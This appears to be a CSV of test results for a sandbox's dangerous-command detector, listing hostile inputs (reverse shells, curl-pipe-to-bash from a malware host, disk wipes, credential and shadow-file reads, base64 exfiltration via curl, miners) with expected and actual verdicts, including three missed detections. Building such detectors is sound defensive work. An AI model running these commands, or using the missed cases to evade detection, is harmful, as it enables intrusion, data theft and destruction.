模块,id,category,输入,期望结果,实际结果,判定
沙箱执行,hd-001,dangerous_cmd,bash -i >& /dev/tcp/10.0.0.1/4444,dangerous/True,dangerous/True,通过
沙箱执行,hd-002,dangerous_cmd,curl http://malware-c2.xyz/x.sh | bash,dangerous/True,dangerous/True,通过
沙箱执行,hd-003,dangerous_cmd,chmod +s /usr/bin/bash,dangerous/True,dangerous/True,通过
沙箱执行,hd-004,dangerous_cmd,dd if=/dev/zero of=/dev/sda,dangerous/True,dangerous/True,通过
沙箱执行,hd-005,dangerous_cmd,wget http://malware-c2.xyz/malware -O /tmp/x && ,dangerous/True,dangerous/True,通过
沙箱执行,hd-006,dangerous_cmd,python3 -c 'import socket; s=socket.socket(); s.,dangerous/True,safe/False,失败
沙箱执行,hd-007,dangerous_cmd,"php -r 'fsockopen(""10.0.0.1"",4444);'",dangerous/True,dangerous/True,通过
沙箱执行,hd-008,dangerous_cmd,insmod /tmp/evil.ko,dangerous/True,dangerous/True,通过
沙箱执行,hd-009,dangerous_cmd,mount -o bind / /mnt,dangerous/True,dangerous/True,通过
沙箱执行,hd-010,dangerous_cmd,mkfs.ext4 /dev/sda1,dangerous/True,dangerous/True,通过
沙箱执行,hd-011,dangerous_cmd,nc -e /bin/bash 10.0.0.1 4444,dangerous/True,safe/False,失败
沙箱执行,hd-012,dangerous_cmd,rmmod usb_storage,dangerous/True,dangerous/True,通过
沙箱执行,hd-013,sensitive_file,cat ~/.ssh/id_rsa,dangerous/True,dangerous/True,通过
沙箱执行,hd-014,sensitive_file,cat ~/.aws/credentials,dangerous/True,dangerous/True,通过
沙箱执行,hd-015,sensitive_file,-----BEGIN RSA PRIVATE KEY-----,dangerous/True,dangerous/True,通过
沙箱执行,hd-016,sensitive_file,cat ~/.gcloud/service-account.json,dangerous/True,dangerous/True,通过
沙箱执行,hd-017,sensitive_file,cat /etc/shadow,suspicious/False,suspicious/False,通过
沙箱执行,hd-018,sensitive_file,cat /etc/sudoers,suspicious/False,suspicious/False,通过
沙箱执行,hd-019,sensitive_file,-----BEGIN CERTIFICATE-----,suspicious/False,suspicious/False,通过
沙箱执行,hd-020,exfiltration,nmap -sV 192.168.1.0/24,dangerous/True,dangerous/True,通过
沙箱执行,hd-021,exfiltration,masscan -p1-65535 10.0.0.0/8,dangerous/True,dangerous/True,通过
沙箱执行,hd-022,exfiltration,base64 -w0 /etc/shadow | curl -X POST -d @- http,dangerous/True,dangerous/True,通过
沙箱执行,hd-023,exfiltration,nslookup abc.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.exam,suspicious/False,suspicious/False,通过
沙箱执行,hd-024,malicious_code,"getattr(__import__('os'), 'system')('id')",dangerous/True,dangerous/True,通过
沙箱执行,hd-025,malicious_code,echo d2hvYW1p | base64 -d | bash,dangerous/True,safe/False,失败
沙箱执行,hd-026,malicious_code,eval(__import__('base64').b64decode('...')),suspicious/False,suspicious/False,通过
沙箱执行,hd-027,malicious_code,"subprocess.run('cmd | bash', shell=True)",suspicious/False,suspicious/False,通过
沙箱执行,hd-028,content_safety,xmrig --donate-level 0,dangerous/True,dangerous/True,通过
沙箱执行,hd-029,content_safety,cpuminer -a cryptonight,dangerous/True,dangerous/True,通过
沙箱执行,hd-030,content_safety,https://abc123.ngrok.io/payload,suspicious/False,suspicious/False,通过
沙箱执行,hd-031,content_safety,https://abcdefghijklmnopqrstuvwxyz.onion,suspicious/False,suspicious/False,通过
沙箱执行,hd-benign-01,benign,ls -la /home,safe/False,safe/False,通过
沙箱执行,hd-benign-02,benign,cat report.pdf,safe/False,safe/False,通过
沙箱执行,hd-benign-03,benign,echo $PATH,safe/False,safe/False,通过
沙箱执行,hd-benign-04,benign,git status,safe/False,safe/False,通过
沙箱执行,hd-benign-05,benign,python script.py --help,safe/False,safe/False,通过
沙箱执行,hd-benign-06,benign,grep -r 'keyword' ./src,safe/False,safe/False,通过
沙箱执行,hd-benign-07,benign,mkdir -p /tmp/backup,safe/False,safe/False,通过
沙箱执行,hd-benign-08,benign,pip install requests,safe/False,safe/False,通过
沙箱执行,hd-benign-09,benign,"python -c ""print(2+2)""",safe/False,safe/False,通过
沙箱执行,hd-benign-10,benign,docker ps,safe/False,safe/False,通过
沙箱执行,hd-benign-11,benign,npm run build,safe/False,safe/False,通过
沙箱执行,hd-benign-12,benign,tar -czf backup.tar.gz ./src,safe/False,safe/False,通过
沙箱执行,hd-benign-13,benign,ps aux | head,safe/False,safe/False,通过
沙箱执行,hd-benign-14,benign,df -h,safe/False,safe/False,通过
沙箱执行,hd-gov-1,exfiltration,cat /data/salary_2026.csv | base64 -w0 | curl -X,dangerous/True,dangerous/True,通过
沙箱执行,hd-gov-2,exfiltration,base64 -w0 /data/citizen_phonebook.csv | curl -X,dangerous/True,dangerous/True,通过
沙箱执行,hd-gov-3,exfiltration,nmap -sV 10.10.0.0/16,dangerous/True,dangerous/True,通过
沙箱执行,hd-gov-4,benign,"grep -c ""2026-08"" /data/salary_2026.csv",safe/False,safe/False,通过
沙箱执行,hd-r01,exfiltration,cat /data/gov_policy_2025.csv | base64 -w0 | cur,dangerous/True,dangerous/True,通过
